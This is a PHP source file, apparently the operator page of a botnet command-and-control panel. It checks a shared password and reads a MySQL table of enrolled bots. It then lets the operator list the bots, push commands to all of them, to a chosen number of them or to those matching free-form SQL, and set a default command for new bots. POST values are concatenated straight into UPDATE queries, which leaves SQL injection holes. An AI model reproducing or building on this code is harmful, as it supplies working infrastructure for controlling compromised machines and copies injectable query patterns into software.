<?php
//error_reporting(E_ALL);
include ("cANDcfunc.php");
include("config.php"); 

$password=$_POST['PWD'];
if ($password != $botpw)
{
echo "wrong password";
exit;
}
echo '<head></head>';
echo '<body style="background-image:url(main-bg.gif)" link="#000000" vlink="#FFFFFF" alink="#FFFFFF">';
$conn=mysql_connect($server,$user,$dbpwd) or die('connect failed');
$db=mysql_select_db($dbname) or die('wrong db');
if ($_POST['sql']!='' && $_POST['command']!=''|| $_POST['count']!=''&& $_POST['command']!=''){
      echo 'a new command will be set<br>';
   if(isset($_POST['sql'])&&isset($_POST['command'])&&$_POST['count']==''){  
      $sql=$_POST['sql'];
      $command=$_POST['command'];
      $b00l=SetBotCommand($sql,$command);}


   if(isset($_POST['count'])&&isset($_POST['command'])&&$_POST['sql']==''&&$_POST['count']!=0){      
      $a="UPDATE bots SET Command='".$_POST['command']."  "."' WHERE Command='wait' LIMIT ".$_POST['count']."";
      $b00l=mysql_query($a) or die('SetbotCommad:'.mysql_error());}


  if(isset($_POST['count'])&&isset($_POST['command'])&&$_POST['sql']==''&&$_POST['count']=='0'){      
      $a="UPDATE bots SET Command='".$_POST['command']."  '";
 
      $b00l=mysql_query($a) or die('SetbotCommad:'.mysql_error());}  
 if($b00l!='TRUE'){
	echo 'something was wrong with your query<br>';}
} 
if(isset($_POST['standartcom'])){
//echo 'StandartCommando'.$_POST['standartcom'];
SetStandartCommand($_POST['standartcom']);}
// now getting what´the user action
    if($_GET['cat']){
//he wants to look at his botnet
      if($_GET['cat']=='Bottable'){
           echo 'Today new Bots:';
           NewBots();
           ShowAllBots($timeout);
           echo "<form action='control.php' method='POST'>";
           $text="<input type='hidden' name='PWD' value=";
           $text=$text."'".$password."'>";
           echo $text;
           echo "<input type='submit' value='MAin'></form>";
           echo '</form>';}

//he want to edit something
    if($_GET['cat']=='options'){
           echo "<form action='control.php' method='POST'>";
           options();
           $text="<input type='hidden' name='PWD' value=";
           $text=$text."'".$password."'>";
           echo $text;
           echo "<br><input type='submit' value='Submit'><br>";
           echo '</form>';}

//he wants to set some commands  
    if($_GET['cat']=='command'){
           echo "<form action='control.php' method='POST'>";
           $text="<input type='hidden' name='PWD' value=";
           $text=$text."'".$password."'>";
           echo $text;
           echo "For all Bots where=<input name='sql' type='text' size='30' maxlength='30'>
	   <br><b><i>OR</i></b><br>for <input name='count' type='text' size='10' maxlength='30'> bots( means all)
          <br><br>Command=<input name='command' type='text' size='50' maxlength='100'><br><input type='submit' value='Submit Command'></form>";} 
    }

if(!$_GET['cat']){
echo 'Have fun controlling your wbot(s)';
statistic("Mini",$timeout);
echo '<hr>';
menu($password);
}
//this is all you get outputtted for the options
function options(){
echo "Set an Command for new bots:<input name='standartcom' type='text' size='50' maxlength='100'>";


}



?>
